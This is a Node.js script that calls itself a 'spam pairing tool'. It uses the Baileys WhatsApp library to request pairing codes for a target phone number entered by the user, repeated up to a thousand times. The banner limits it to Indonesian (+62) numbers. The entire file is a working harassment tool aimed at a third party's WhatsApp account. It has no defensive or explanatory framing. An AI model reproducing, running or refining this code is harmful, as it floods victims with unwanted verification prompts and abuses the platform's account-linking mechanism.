const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");

const color = [
    '\x1b[31m', 
    '\x1b[32m', 
    '\x1b[33m', 
    '\x1b[34m', 
    '\x1b[35m', 
    '\x1b[36m'
];
const wColor = color[Math.floor(Math.random() * color.length)];
const xColor = '\x1b[0m';

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => { rl.question(text, resolve) });
};

async function LuciferXSatanic() {
    const { state } = await useMultiFileAuthState('./69/session');
    const LuciferBot = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });
    try {
        // Minta nomor target
        const phoneNumber = await question(wColor + 'ターゲット番号を入力してください : ' + xColor);
        
        // Minta jumlah spam
        const LuciferCodes = parseInt(await question(wColor + 'スパム回数を入力してください : ' + xColor));

        if (isNaN(LuciferCodes) || LuciferCodes <= 0) {
            console.log('例 : 20');
            return;
        }

        // Loop kirim pairing code
        for (let i = 0; i < LuciferCodes; i++) {
            try {
                let code = await LuciferBot.requestPairingCode(phoneNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                console.log(wColor + `スパム成功 ✅ 番号 : ${phoneNumber} [${i + 1}/${LuciferCodes}]` + xColor);
            } catch (error) {
                console.error('エラー:', error.message);
            }
        }
    } catch (error) {
        console.error('エラーが発生しました');
    }

    return LuciferBot;
}

console.log(wColor + `=========================
 • スパムペアリングツール
 • 作成者: Hazel
 • 使用注意
=========================
┏❐
┃ [ 以下の指示に従ってください ]
┃
┃⭔ ターゲット番号 (例: 62xxxxxxx)
┃⭔ スパム回数 (1-1000)
┃
┃ [ このツールは +62 の番号でのみ使用可能です ]
┗❐
=========================` + xColor);

LuciferXSatanic();
